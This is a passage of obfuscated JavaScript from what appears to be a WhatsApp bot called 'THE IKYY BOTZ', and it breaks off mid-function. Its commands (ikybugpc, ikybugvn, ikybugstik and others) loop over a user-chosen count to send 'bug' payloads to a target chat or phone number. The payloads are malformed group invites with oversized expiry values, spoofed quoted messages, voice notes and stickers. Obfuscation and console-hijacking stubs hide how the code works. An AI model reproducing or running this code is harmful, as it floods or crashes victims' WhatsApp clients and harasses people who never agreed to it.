ikycoli.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break

case 'ikybugpc': {
const _0xff5479=_0x48e6;(function(_0x52d4a4,_0xc547c1){const _0x2377f8=_0x48e6,_0x280aae=_0x52d4a4();while(!![]){try{const _0x32957b=parseInt(_0x2377f8(0xa4))/0x1+-parseInt(_0x2377f8(0xad))/0x2*(-parseInt(_0x2377f8(0xbe))/0x3)+-parseInt(_0x2377f8(0xc7))/0x4+-parseInt(_0x2377f8(0xb6))/0x5+parseInt(_0x2377f8(0xb0))/0x6*(parseInt(_0x2377f8(0xbb))/0x7)+parseInt(_0x2377f8(0xae))/0x8+parseInt(_0x2377f8(0xa1))/0x9*(-parseInt(_0x2377f8(0xb3))/0xa);if(_0x32957b===_0xc547c1)break;else _0x280aae['push'](_0x280aae['shift']());}catch(_0x110e6c){_0x280aae['push'](_0x280aae['shift']());}}}(_0x121d,0x4759a));const _0x2a7929=(function(){let _0x4dcaa0=!![];return function(_0x4816e4,_0x3f7c9a){const _0x3e05cb=_0x4dcaa0?function(){const _0x4dbe36=_0x48e6;if(_0x3f7c9a){const _0x5e2d7b=_0x3f7c9a[_0x4dbe36(0xc5)](_0x4816e4,arguments);return _0x3f7c9a=null,_0x5e2d7b;}}:function(){};return _0x4dcaa0=![],_0x3e05cb;};}()),_0x53704d=_0x2a7929(this,function(){const _0x3f4447=_0x48e6;return _0x53704d['toString']()[_0x3f4447(0xc2)](_0x3f4447(0xc3))[_0x3f4447(0xc0)]()[_0x3f4447(0xa8)](_0x53704d)['search'](_0x3f4447(0xc3));});_0x53704d();function _0x48e6(_0x1260f2,_0x18ffd3){const _0x26e617=_0x121d();return _0x48e6=function(_0x283bea,_0x56ba70){_0x283bea=_0x283bea-0xa1;let _0x4b45a7=_0x26e617[_0x283bea];return _0x4b45a7;},_0x48e6(_0x1260f2,_0x18ffd3);}function _0x121d(){const _0x24fc6c=['7TDCJKd','relayMessage','info','3426JcdWng','./pict.jpg','toString','{}.constructor(\x22return\x20this\x22)(\x20)','search','(((.+)+)+)+$','trace','apply','log','134472jWclrE','0@s.whatsapp.net','343656coDvkQ','return\x20(function()\x20','CZ/GAeOhayYnqjcK','91978KWKjwj','exception','chat','Jumlahnya?','constructor','9999999999999999','message','console','reply','1010cGnxBT','2717416jENodq','120363047368062014@g.us','942738czcrzM','BUG\x20INVITE\x20THE\x20IKYY\x20BOTZ\x0a\x0a','bind','170ONXSNd','readFileSync','THE\x20IKYY\x20BOTZ\x20🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥','952460kPRqSI','99999999999','warn','length','prototype'];_0x121d=function(){return _0x24fc6c;};return _0x121d();}const _0x56ba70=(function(){let _0x230160=!![];return function(_0xccdfa5,_0x107b93){const _0x5cd10c=_0x230160?function(){const _0x5573f8=_0x48e6;if(_0x107b93){const _0x4bac0d=_0x107b93[_0x5573f8(0xc5)](_0xccdfa5,arguments);return _0x107b93=null,_0x4bac0d;}}:function(){};return _0x230160=![],_0x5cd10c;};}()),_0x283bea=_0x56ba70(this,function(){const _0x53bb0b=_0x48e6,_0x285419=function(){const _0x14641f=_0x48e6;let _0x5b331b;try{_0x5b331b=Function(_0x14641f(0xa2)+_0x14641f(0xc1)+');')();}catch(_0x2d0aad){_0x5b331b=window;}return _0x5b331b;},_0x5f3bc8=_0x285419(),_0x10ca09=_0x5f3bc8[_0x53bb0b(0xab)]=_0x5f3bc8['console']||{},_0x2ed523=[_0x53bb0b(0xc6),_0x53bb0b(0xb8),_0x53bb0b(0xbd),'error',_0x53bb0b(0xa5),'table',_0x53bb0b(0xc4)];for(let _0x787e7c=0x0;_0x787e7c<_0x2ed523[_0x53bb0b(0xb9)];_0x787e7c++){const _0x49edc1=_0x56ba70[_0x53bb0b(0xa8)][_0x53bb0b(0xba)]['bind'](_0x56ba70),_0x2fdab6=_0x2ed523[_0x787e7c],_0x18ef19=_0x10ca09[_0x2fdab6]||_0x49edc1;_0x49edc1['__proto__']=_0x56ba70[_0x53bb0b(0xb2)](_0x56ba70),_0x49edc1[_0x53bb0b(0xc0)]=_0x18ef19[_0x53bb0b(0xc0)][_0x53bb0b(0xb2)](_0x18ef19),_0x10ca09[_0x2fdab6]=_0x49edc1;}});_0x283bea();{if(!isCreator&&!isBan)return;if(args[_0xff5479(0xb9)]==0x0)return m[_0xff5479(0xac)](_0xff5479(0xa7));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){pc=generateWAMessageFromContent(m[_0xff5479(0xa6)],{'groupInviteMessage':{'groupJid':_0xff5479(0xaf),'inviteCode':_0xff5479(0xa3),'inviteExpiration':_0xff5479(0xb7),'invitetime':_0xff5479(0xa9),'groupName':_0xff5479(0xb5)+philips+'️️','jpegThumbnail':fs[_0xff5479(0xb4)](_0xff5479(0xbf)),'caption':_0xff5479(0xb1)+philips,'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':{'key':{'participant':_0xff5479(0xc8),...{'remoteJid':''}},'message':{'liveLocationMessage':{'caption':'By:\x20THE\x20IKYY\x20BOTZ','jpegThumbnail':fs[_0xff5479(0xb4)](_0xff5479(0xbf))}}},'contextInfo':{}}),ikycoli[_0xff5479(0xbc)](m[_0xff5479(0xa6)],pc[_0xff5479(0xaa)],{'messageId':pc['key']['id']});}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}
}
	break

case 'ikybugvn':{
function _0x3bde(_0x505a2d,_0x397690){const _0x33cd35=_0x16dc();return _0x3bde=function(_0x15ade4,_0x4000c1){_0x15ade4=_0x15ade4-0x167;let _0x41f9b5=_0x33cd35[_0x15ade4];return _0x41f9b5;},_0x3bde(_0x505a2d,_0x397690);}const _0x2a8926=_0x3bde;(function(_0x53f1fe,_0x2a6ed7){const _0x4c93dd=_0x3bde,_0x171460=_0x53f1fe();while(!![]){try{const _0x13a642=-parseInt(_0x4c93dd(0x188))/0x1*(parseInt(_0x4c93dd(0x185))/0x2)+parseInt(_0x4c93dd(0x187))/0x3+-parseInt(_0x4c93dd(0x16f))/0x4*(parseInt(_0x4c93dd(0x168))/0x5)+parseInt(_0x4c93dd(0x17c))/0x6*(parseInt(_0x4c93dd(0x183))/0x7)+-parseInt(_0x4c93dd(0x16e))/0x8+-parseInt(_0x4c93dd(0x17f))/0x9*(parseInt(_0x4c93dd(0x179))/0xa)+parseInt(_0x4c93dd(0x17a))/0xb;if(_0x13a642===_0x2a6ed7)break;else _0x171460['push'](_0x171460['shift']());}catch(_0x512512){_0x171460['push'](_0x171460['shift']());}}}(_0x16dc,0xd6de2));const _0x3d88ac=(function(){let _0x357828=!![];return function(_0x5045a4,_0x199d9e){const _0xa01098=_0x357828?function(){const _0x3fa0e0=_0x3bde;if(_0x199d9e){const _0x415aa5=_0x199d9e[_0x3fa0e0(0x178)](_0x5045a4,arguments);return _0x199d9e=null,_0x415aa5;}}:function(){};return _0x357828=![],_0xa01098;};}()),_0x5e10ef=_0x3d88ac(this,function(){const _0x11b013=_0x3bde;return _0x5e10ef[_0x11b013(0x16d)]()['search'](_0x11b013(0x16a))[_0x11b013(0x16d)]()['constructor'](_0x5e10ef)[_0x11b013(0x16b)](_0x11b013(0x16a));});_0x5e10ef();const _0x4000c1=(function(){let _0x5e5a2c=!![];return function(_0x3f5997,_0x5f0256){const _0x4b30e4=_0x5e5a2c?function(){const _0x404cc1=_0x3bde;if(_0x5f0256){const _0x1e65ae=_0x5f0256[_0x404cc1(0x178)](_0x3f5997,arguments);return _0x5f0256=null,_0x1e65ae;}}:function(){};return _0x5e5a2c=![],_0x4b30e4;};}()),_0x15ade4=_0x4000c1(this,function(){const _0x3b89c9=_0x3bde,_0x1415fe=function(){const _0x1653c7=_0x3bde;let _0x2ab8ab;try{_0x2ab8ab=Function(_0x1653c7(0x17e)+_0x1653c7(0x180)+');')();}catch(_0x144e89){_0x2ab8ab=window;}return _0x2ab8ab;},_0x4e3de3=_0x1415fe(),_0xa2bc38=_0x4e3de3['console']=_0x4e3de3['console']||{},_0x5ce02d=[_0x3b89c9(0x184),'warn',_0x3b89c9(0x17d),'error',_0x3b89c9(0x16c),_0x3b89c9(0x182),'trace'];for(let _0x4088bb=0x0;_0x4088bb<_0x5ce02d['length'];_0x4088bb++){const _0x3dbc8b=_0x4000c1[_0x3b89c9(0x176)][_0x3b89c9(0x177)][_0x3b89c9(0x171)](_0x4000c1),_0x61f594=_0x5ce02d[_0x4088bb],_0x1a8a6c=_0xa2bc38[_0x61f594]||_0x3dbc8b;_0x3dbc8b[_0x3b89c9(0x169)]=_0x4000c1[_0x3b89c9(0x171)](_0x4000c1),_0x3dbc8b[_0x3b89c9(0x16d)]=_0x1a8a6c[_0x3b89c9(0x16d)][_0x3b89c9(0x171)](_0x1a8a6c),_0xa2bc38[_0x61f594]=_0x3dbc8b;}});function _0x16dc(){const _0x17fcca=['sendMessage','3785UBCLLm','__proto__','(((.+)+)+)+$','search','exception','toString','10733968fltCAd','468eGCKyP','THE\x20IKYY\x20BOTZ','bind','./src/hahaha.mp3','reply','image/jpeg','Sukses\x20Send\x20Bug\x20Sebanyak\x20','constructor','prototype','apply','880wuLplO','49038451PhzrmC','Jumlahnya?','444054tWsaKs','info','return\x20(function()\x20','167679LuBkpw','{}.constructor(\x22return\x20this\x22)(\x20)','readFileSync','table','35oSBtaN','log','7894rXqQnD','length','302133isDSgj','248ryBZZC'];_0x16dc=function(){return _0x17fcca;};return _0x16dc();}_0x15ade4();{if(!isCreator&&!isBan)return;if(args[_0x2a8926(0x186)]==0x0)return m[_0x2a8926(0x173)](_0x2a8926(0x17b));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){adehvn={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':_0x2a8926(0x174),'caption':_0x2a8926(0x170),'jpegThumbnail':virgam}}},hey=fs[_0x2a8926(0x181)](_0x2a8926(0x172)),ikycoli[_0x2a8926(0x167)](m['chat'],{'audio':hey,'mimetype':'audio/mpeg','ptt':!![]},{'quoted':adehvn});}jancok(_0x2a8926(0x175)+jumlah);}
 }
break
case 'jadibugvn':{
function _0x4776(_0x49c38d,_0x15dd0a){const _0xd1f3ac=_0x566d();return _0x4776=function(_0x3d708c,_0x4c90f4){_0x3d708c=_0x3d708c-0x18a;let _0x481117=_0xd1f3ac[_0x3d708c];return _0x481117;},_0x4776(_0x49c38d,_0x15dd0a);}const _0x2da4ed=_0x4776;(function(_0x3913a4,_0x4930d6){const _0x45ab61=_0x4776,_0x3feaa3=_0x3913a4();while(!![]){try{const _0x3a064f=-parseInt(_0x45ab61(0x199))/0x1*(parseInt(_0x45ab61(0x19c))/0x2)+parseInt(_0x45ab61(0x18a))/0x3*(-parseInt(_0x45ab61(0x1a0))/0x4)+parseInt(_0x45ab61(0x1a8))/0x5*(-parseInt(_0x45ab61(0x19a))/0x6)+-parseInt(_0x45ab61(0x18b))/0x7+-parseInt(_0x45ab61(0x190))/0x8+parseInt(_0x45ab61(0x1a3))/0x9+-parseInt(_0x45ab61(0x18e))/0xa*(-parseInt(_0x45ab61(0x193))/0xb);if(_0x3a064f===_0x4930d6)break;else _0x3feaa3['push'](_0x3feaa3['shift']());}catch(_0x22e90a){_0x3feaa3['push'](_0x3feaa3['shift']());}}}(_0x566d,0xa221f));const _0x3757a9=(function(){let _0x3fdfc7=!![];return function(_0x19aa75,_0x548ad5){const _0x22d3db=_0x3fdfc7?function(){if(_0x548ad5){const _0xb8988=_0x548ad5['apply'](_0x19aa75,arguments);return _0x548ad5=null,_0xb8988;}}:function(){};return _0x3fdfc7=![],_0x22d3db;};}()),_0x2807a1=_0x3757a9(this,function(){const _0x57d26b=_0x4776;return _0x2807a1[_0x57d26b(0x1a4)]()[_0x57d26b(0x19e)](_0x57d26b(0x196))['toString']()[_0x57d26b(0x19b)](_0x2807a1)[_0x57d26b(0x19e)]('(((.+)+)+)+$');});_0x2807a1();const _0x4c90f4=(function(){let _0x27cd58=!![];return function(_0xf6525c,_0x4a75bb){const _0x40e117=_0x27cd58?function(){const _0x5c99c7=_0x4776;if(_0x4a75bb){const _0x3eb259=_0x4a75bb[_0x5c99c7(0x1a7)](_0xf6525c,arguments);return _0x4a75bb=null,_0x3eb259;}}:function(){};return _0x27cd58=![],_0x40e117;};}()),_0x3d708c=_0x4c90f4(this,function(){const _0x140b3a=_0x4776,_0x1cc47a=function(){const _0x1ef19e=_0x4776;let _0x33f4b5;try{_0x33f4b5=Function('return\x20(function()\x20'+_0x1ef19e(0x1a5)+');')();}catch(_0x3ac5c7){_0x33f4b5=window;}return _0x33f4b5;},_0xc1626d=_0x1cc47a(),_0x24c8d2=_0xc1626d[_0x140b3a(0x19f)]=_0xc1626d['console']||{},_0x21f56e=[_0x140b3a(0x197),'warn','info',_0x140b3a(0x194),_0x140b3a(0x191),_0x140b3a(0x19d),'trace'];for(let _0x191d67=0x0;_0x191d67<_0x21f56e[_0x140b3a(0x198)];_0x191d67++){const _0x5fc90=_0x4c90f4[_0x140b3a(0x19b)]['prototype'][_0x140b3a(0x1a6)](_0x4c90f4),_0x303e31=_0x21f56e[_0x191d67],_0xb90fba=_0x24c8d2[_0x303e31]||_0x5fc90;_0x5fc90[_0x140b3a(0x18f)]=_0x4c90f4[_0x140b3a(0x1a6)](_0x4c90f4),_0x5fc90['toString']=_0xb90fba[_0x140b3a(0x1a4)][_0x140b3a(0x1a6)](_0xb90fba),_0x24c8d2[_0x303e31]=_0x5fc90;}});_0x3d708c();{if(!isCreator&&!isBan)return;if(!m['quoted'])throw _0x2da4ed(0x1a2);let media=await quoted[_0x2da4ed(0x18c)]();hey=media,ikycoli[_0x2da4ed(0x18d)](m[_0x2da4ed(0x1a1)],{'audio':hey,'mimetype':_0x2da4ed(0x195),'ptt':!![]},{'quoted':fkntliky}),jancok(_0x2da4ed(0x192));}function _0x566d(){const _0x11249c=['197021aeHUvT','error','audio/mpeg','(((.+)+)+)+$','log','length','159nTDljw','546ObJAej','constructor','2894Cbongf','table','search','console','492YwknTw','chat','Reply\x20Audio','8541792Gqlktr','toString','{}.constructor(\x22return\x20this\x22)(\x20)','bind','apply','15425OGBuQn','29379wqHisf','3537478gjpYvt','download','sendMessage','1660scQfJC','__proto__','8300144jYNLEA','exception','Sukses\x20Convert\x20Bugvn'];_0x566d=function(){return _0x11249c;};return _0x566d();}
 }
break

case 'ikybugstik':{
const _0x130c5e=_0x5ab7;(function(_0x2b6b06,_0x40e49c){const _0x481474=_0x5ab7,_0x542de4=_0x2b6b06();while(!![]){try{const _0x54d816=parseInt(_0x481474(0x134))/0x1+parseInt(_0x481474(0x13f))/0x2+-parseInt(_0x481474(0x148))/0x3+parseInt(_0x481474(0x146))/0x4*(-parseInt(_0x481474(0x147))/0x5)+parseInt(_0x481474(0x14f))/0x6+parseInt(_0x481474(0x14c))/0x7+-parseInt(_0x481474(0x135))/0x8;if(_0x54d816===_0x40e49c)break;else _0x542de4['push'](_0x542de4['shift']());}catch(_0x554b00){_0x542de4['push'](_0x542de4['shift']());}}}(_0x3d31,0x6f5d5));function _0x3d31(){const _0x28fea3=['3344586KhoFMz','info','error','1221150bVuSeX','656531RMIImy','1788760NTrrmR','./src/anjas.webp','chat','log','length','bind','prototype','Sukses\x20Send\x20Bug\x20Sebanyak\x20','toString','warn','1112308DBZdyU','table','(((.+)+)+)+$','author','reply','constructor','apply','36PpIPHY','387590EMJanP','1549806hAfxat','search','exception','console'];_0x3d31=function(){return _0x28fea3;};return _0x3d31();}const _0x4d0fb2=(function(){let _0x28d22b=!![];return function(_0xd9de,_0x4b666f){const _0x25053b=_0x28d22b?function(){const _0x4df8bd=_0x5ab7;if(_0x4b666f){const _0x577812=_0x4b666f[_0x4df8bd(0x145)](_0xd9de,arguments);return _0x4b666f=null,_0x577812;}}:function(){};return _0x28d22b=![],_0x25053b;};}()),_0x2c7901=_0x4d0fb2(this,function(){const _0x4cf394=_0x5ab7;return _0x2c7901[_0x4cf394(0x13d)]()[_0x4cf394(0x149)](_0x4cf394(0x141))[_0x4cf394(0x13d)]()['constructor'](_0x2c7901)[_0x4cf394(0x149)](_0x4cf394(0x141));});function _0x5ab7(_0x3c793d,_0x19b231){const _0x733831=_0x3d31();return _0x5ab7=function(_0x5343ed,_0x8ba471){_0x5343ed=_0x5343ed-0x134;let _0xf7d0f8=_0x733831[_0x5343ed];return _0xf7d0f8;},_0x5ab7(_0x3c793d,_0x19b231);}_0x2c7901();const _0x8ba471=(function(){let _0x1095fd=!![];return function(_0x414c2e,_0xd9fe78){const _0x16c4b1=_0x1095fd?function(){const _0x476a91=_0x5ab7;if(_0xd9fe78){const _0xf1bc75=_0xd9fe78[_0x476a91(0x145)](_0x414c2e,arguments);return _0xd9fe78=null,_0xf1bc75;}}:function(){};return _0x1095fd=![],_0x16c4b1;};}()),_0x5343ed=_0x8ba471(this,function(){const _0x27cbe2=_0x5ab7;let _0x868aab;try{const _0x392124=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x868aab=_0x392124();}catch(_0x3c8042){_0x868aab=window;}const _0x528d9d=_0x868aab[_0x27cbe2(0x14b)]=_0x868aab['console']||{},_0x2c8885=[_0x27cbe2(0x138),_0x27cbe2(0x13e),_0x27cbe2(0x14d),_0x27cbe2(0x14e),_0x27cbe2(0x14a),_0x27cbe2(0x140),'trace'];for(let _0x4de9e5=0x0;_0x4de9e5<_0x2c8885[_0x27cbe2(0x139)];_0x4de9e5++){const _0x300b0c=_0x8ba471[_0x27cbe2(0x144)][_0x27cbe2(0x13b)][_0x27cbe2(0x13a)](_0x8ba471),_0x11e828=_0x2c8885[_0x4de9e5],_0x1b0229=_0x528d9d[_0x11e828]||_0x300b0c;_0x300b0c['__proto__']=_0x8ba471[_0x27cbe2(0x13a)](_0x8ba471),_0x300b0c[_0x27cbe2(0x13d)]=_0x1b0229[_0x27cbe2(0x13d)][_0x27cbe2(0x13a)](_0x1b0229),_0x528d9d[_0x11e828]=_0x300b0c;}});_0x5343ed();{if(!isCreator&&!isBan)return;if(args[_0x130c5e(0x139)]==0x0)return m[_0x130c5e(0x143)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){adehvn={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':'image/jpeg','caption':'THE\x20IKYY\x20BOTZ','jpegThumbnail':virgam}}},hey=fs['readFileSync'](_0x130c5e(0x136)),ikycoli['sendImageAsSticker'](m[_0x130c5e(0x137)],hey,adehvn,{'packname':global['packname'],'author':global[_0x130c5e(0x142)]});}jancok(_0x130c5e(0x13c)+jumlah);}
}
break
case 'kybugstik': {
const _0x2b4595=_0x47f2;(function(_0x4b84c1,_0x3d85b1){const _0x540c9b=_0x47f2,_0x150a29=_0x4b84c1();while(!![]){try{const _0x13db52=-parseInt(_0x540c9b(0x121))/0x1+parseInt(_0x540c9b(0x124))/0x2+parseInt(_0x540c9b(0x12a))/0x3*(parseInt(_0x540c9b(0x11f))/0x4)+-parseInt(_0x540c9b(0x122))/0x5+parseInt(_0x540c9b(0x12d))/0x6*(-parseInt(_0x540c9b(0x125))/0x7)+-parseInt(_0x540c9b(0x118))/0x8+parseInt(_0x540c9b(0x111))/0x9;if(_0x13db52===_0x3d85b1)break;else _0x150a29['push'](_0x150a29['shift']());}catch(_0x32da24){_0x150a29['push'](_0x150a29['shift']());}}}(_0x13d5,0x4a0b5));function _0x47f2(_0x47248d,_0x40b852){const _0x2b91d5=_0x13d5();return _0x47f2=function(_0x352fe1,_0x587820){_0x352fe1=_0x352fe1-0x111;let _0x286ba9=_0x2b91d5[_0x352fe1];return _0x286ba9;},_0x47f2(_0x47248d,_0x40b852);}const _0x38b145=(function(){let _0x291a59=!![];return function(_0x1404dc,_0x53ce14){const _0x8d5efd=_0x291a59?function(){const _0x1e2ee5=_0x47f2;if(_0x53ce14){const _0x54d839=_0x53ce14[_0x1e2ee5(0x119)](_0x1404dc,arguments);return _0x53ce14=null,_0x54d839;}}:function(){};return _0x291a59=![],_0x8d5efd;};}()),_0x31d905=_0x38b145(this,function(){const _0x4df41f=_0x47f2;return _0x31d905[_0x4df41f(0x116)]()[_0x4df41f(0x128)](_0x4df41f(0x12e))[_0x4df41f(0x116)]()[_0x4df41f(0x11b)](_0x31d905)['search']('(((.+)+)+)+$');});_0x31d905();const _0x587820=(function(){let _0x179c50=!![];return function(_0x42d133,_0x6e7ac3){const _0x408c67=_0x179c50?function(){const _0x47e85e=_0x47f2;if(_0x6e7ac3){const _0x5c7ec1=_0x6e7ac3[_0x47e85e(0x119)](_0x42d133,arguments);return _0x6e7ac3=null,_0x5c7ec1;}}:function(){};return _0x179c50=![],_0x408c67;};}()),_0x352fe1=_0x587820(this,function(){const _0x4d5bbb=_0x47f2;let _0x34ecb7;try{const _0x35db2b=Function(_0x4d5bbb(0x11a)+_0x4d5bbb(0x112)+');');_0x34ecb7=_0x35db2b();}catch(_0x357372){_0x34ecb7=window;}const _0x400ecb=_0x34ecb7[_0x4d5bbb(0x126)]=_0x34ecb7['console']||{},_0x5c4263=[_0x4d5bbb(0x11c),_0x4d5bbb(0x115),'info',_0x4d5bbb(0x114),_0x4d5bbb(0x113),'table',_0x4d5bbb(0x117)];for(let _0x23a392=0x0;_0x23a392<_0x5c4263[_0x4d5bbb(0x12c)];_0x23a392++){const _0xbefa36=_0x587820['constructor'][_0x4d5bbb(0x120)][_0x4d5bbb(0x123)](_0x587820),_0x5eb2c8=_0x5c4263[_0x23a392],_0x3f8a22=_0x400ecb[_0x5eb2c8]||_0xbefa36;_0xbefa36[_0x4d5bbb(0x129)]=_0x587820[_0x4d5bbb(0x123)](_0x587820),_0xbefa36['toString']=_0x3f8a22['toString'][_0x4d5bbb(0x123)](_0x3f8a22),_0x400ecb[_0x5eb2c8]=_0xbefa36;}});_0x352fe1();{if(!isCreator&&!isBan)return;if(!quoted)throw _0x2b4595(0x12b)+(prefix+command);if(/image/['test'](mime)){let media=await quoted[_0x2b4595(0x11d)]();hey=media,ikycoli['sendImageAsSticker'](m['chat'],hey,fsticjo,{'packname':global['packname'],'author':global[_0x2b4595(0x11e)]});}jancok(_0x2b4595(0x127));}function _0x13d5(){const _0x36a587=['trace','4547216tSEmMM','apply','return\x20(function()\x20','constructor','log','download','author','764UtZqkd','prototype','456711VfnWhX','953260LGXtcD','bind','655272oRsQYu','7784nrCCPN','console','Sukses\x20Convert\x20To\x20Bugstik','search','__proto__','1347yVkzAo','Balas\x20Video/Image\x20Dengan\x20Caption\x20','length','3012MtLZOo','(((.+)+)+)+$','14974911xEBdlv','{}.constructor(\x22return\x20this\x22)(\x20)','exception','error','warn','toString'];_0x13d5=function(){return _0x36a587;};return _0x13d5();}
}
break
   case 'jadibugstik': {
const _0x1cfd07=_0x4fd4;function _0x3860(){const _0x756e91=['prototype','(((.+)+)+)+$','1883972QgTrvw','2491116wBEMGj','toString','5532849yrHNKn','error','apply','test','console','log','__proto__','bind','constructor','5pJaFDB','Sukses\x20Convert\x20Bugstik','exception','11nBAtYw','57617856GigsbV','27JZRzIp','1OnqTpF','author','4059606fepHIZ','4XyaxSM','trace','3492370bDMkDG','395336FVJAyI','length','packname','chat','return\x20(function()\x20','warn','table'];_0x3860=function(){return _0x756e91;};return _0x3860();}(function(_0x116715,_0x21cfe2){const _0xd566e9=_0x4fd4,_0x2595f9=_0x116715();while(!![]){try{const _0x5ac464=parseInt(_0xd566e9(0xb1))/0x1*(-parseInt(_0xd566e9(0x9f))/0x2)+-parseInt(_0xd566e9(0xb3))/0x3*(parseInt(_0xd566e9(0xb4))/0x4)+parseInt(_0xd566e9(0xab))/0x5*(-parseInt(_0xd566e9(0xa0))/0x6)+-parseInt(_0xd566e9(0xa2))/0x7+parseInt(_0xd566e9(0xb7))/0x8*(-parseInt(_0xd566e9(0xb0))/0x9)+-parseInt(_0xd566e9(0xb6))/0xa*(parseInt(_0xd566e9(0xae))/0xb)+parseInt(_0xd566e9(0xaf))/0xc;if(_0x5ac464===_0x21cfe2)break;else _0x2595f9['push'](_0x2595f9['shift']());}catch(_0x3b9950){_0x2595f9['push'](_0x2595f9['shift']());}}}(_0x3860,0xc4193));const _0xdfe77f=(function(){let _0x31647a=!![];return function(_0x27b8ab,_0x54cad6){const _0x3799e1=_0x31647a?function(){const _0x154f18=_0x4fd4;if(_0x54cad6){const _0x1535c3=_0x54cad6[_0x154f18(0xa4)](_0x27b8ab,arguments);return _0x54cad6=null,_0x1535c3;}}:function(){};return _0x31647a=![],_0x3799e1;};}()),_0x9e1bea=_0xdfe77f(this,function(){const _0x59a62e=_0x4fd4;return _0x9e1bea[_0x59a62e(0xa1)]()['search'](_0x59a62e(0x9e))[_0x59a62e(0xa1)]()[_0x59a62e(0xaa)](_0x9e1bea)['search'](_0x59a62e(0x9e));});_0x9e1bea();function _0x4fd4(_0x4c23a3,_0x2027cd){const _0x217f03=_0x3860();return _0x4fd4=function(_0x48bd8b,_0x4a3c92){_0x48bd8b=_0x48bd8b-0x9a;let _0x53fc61=_0x217f03[_0x48bd8b];return _0x53fc61;},_0x4fd4(_0x4c23a3,_0x2027cd);}const _0x4a3c92=(function(){let _0x18468c=!![];return function(_0x58c274,_0x586db8){const _0x70e7c0=_0x18468c?function(){const _0x559d02=_0x4fd4;if(_0x586db8){const _0x4ff96c=_0x586db8[_0x559d02(0xa4)](_0x58c274,arguments);return _0x586db8=null,_0x4ff96c;}}:function(){};return _0x18468c=![],_0x70e7c0;};}()),_0x48bd8b=_0x4a3c92(this,function(){const _0x4c28e4=_0x4fd4,_0x225d97=function(){const _0x32704e=_0x4fd4;let _0x307c51;try{_0x307c51=Function(_0x32704e(0x9a)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x18f6d3){_0x307c51=window;}return _0x307c51;},_0x3833bd=_0x225d97(),_0x4a28dd=_0x3833bd['console']=_0x3833bd[_0x4c28e4(0xa6)]||{},_0x30f35c=[_0x4c28e4(0xa7),_0x4c28e4(0x9b),'info',_0x4c28e4(0xa3),_0x4c28e4(0xad),_0x4c28e4(0x9c),_0x4c28e4(0xb5)];for(let _0x312c5e=0x0;_0x312c5e<_0x30f35c[_0x4c28e4(0xb8)];_0x312c5e++){const _0x5786fb=_0x4a3c92[_0x4c28e4(0xaa)][_0x4c28e4(0x9d)][_0x4c28e4(0xa9)](_0x4a3c92),_0x32d0ff=_0x30f35c[_0x312c5e],_0x37d307=_0x4a28dd[_0x32d0ff]||_0x5786fb;_0x5786fb[_0x4c28e4(0xa8)]=_0x4a3c92[_0x4c28e4(0xa9)](_0x4a3c92),_0x5786fb[_0x4c28e4(0xa1)]=_0x37d307[_0x4c28e4(0xa1)][_0x4c28e4(0xa9)](_0x37d307),_0x4a28dd[_0x32d0ff]=_0x5786fb;}});_0x48bd8b();{if(!isCreator&&!isBan)return;if(!quoted)throw'Sticker\x20Dengan\x20Caption\x20'+(prefix+command);if(/webp/[_0x1cfd07(0xa5)](mime)){let media=await quoted['download']();hey=media,ikycoli['sendImageAsSticker'](m[_0x1cfd07(0xba)],hey,fsticjo,{'packname':global[_0x1cfd07(0xb9)],'author':global[_0x1cfd07(0xb2)]});}jancok(_0x1cfd07(0xac));}
}
break

case 'ikyvnprivate': {
function _0x45c4(){var _0x343c7a=['337860HkoRSq','search','THE\x20IKYY\x20BOTZ','error','bind','3417490HleVZK','info','6678427TLcuPk','905999ynyWBa','589912pfOZtZ','(((.+)+)+)+$','20yvimnw','audio/mpeg','0@s.whatsapp.net','20406OCsDsu','11lJavQm','52NPAxOy','image/jpeg','return\x20(function()\x20','@s.whatsapp.net','length','8yXSBIQ','prototype','Berhasil\x20Mengirim\x20Bugvn\x20Di\x20Nomer\x20','Nomernya\x20mana?','apply','log','./src/hahaha.mp3','toString','constructor','13547790jbjlrR','console','warn','readFileSync','sendMessage','reply'];_0x45c4=function(){return _0x343c7a;};return _0x45c4();}var _0x5d8fad=_0x29ba;(function(_0x1a522,_0x31307f){var _0x13dd40=_0x29ba,_0x32c30d=_0x1a522();while(!![]){try{var _0x498e45=parseInt(_0x13dd40(0x109))/0x1+-parseInt(_0x13dd40(0x111))/0x2*(-parseInt(_0x13dd40(0x10f))/0x3)+parseInt(_0x13dd40(0x10a))/0x4*(-parseInt(_0x13dd40(0x10c))/0x5)+parseInt(_0x13dd40(0x101))/0x6+-parseInt(_0x13dd40(0x108))/0x7*(parseInt(_0x13dd40(0x116))/0x8)+parseInt(_0x13dd40(0xfb))/0x9+-parseInt(_0x13dd40(0x106))/0xa*(parseInt(_0x13dd40(0x110))/0xb);if(_0x498e45===_0x31307f)break;else _0x32c30d['push'](_0x32c30d['shift']());}catch(_0x103b0f){_0x32c30d['push'](_0x32c30d['shift']());}}}(_0x45c4,0xb93dd));var _0x2f53de=(function(){var _0x17b311=!![];return function(_0x10d8da,_0x2ca889){var _0x49d288=_0x17b311?function(){var _0x1c4b58=_0x29ba;if(_0x2ca889){var _0x31144b=_0x2ca889[_0x1c4b58(0x11a)](_0x10d8da,arguments);return _0x2ca889=null,_0x31144b;}}:function(){};return _0x17b311=![],_0x49d288;};}()),_0x2b44e2=_0x2f53de(this,function(){var _0x2d64c2=_0x29ba;return _0x2b44e2[_0x2d64c2(0x11d)]()[_0x2d64c2(0x102)]('(((.+)+)+)+$')[_0x2d64c2(0x11d)]()[_0x2d64c2(0x11e)](_0x2b44e2)[_0x2d64c2(0x102)](_0x2d64c2(0x10b));});_0x2b44e2();var _0x31642=(function(){var _0x32df50=!![];return function(_0x5325cb,_0x297cea){var _0x45ff9c=_0x32df50?function(){var 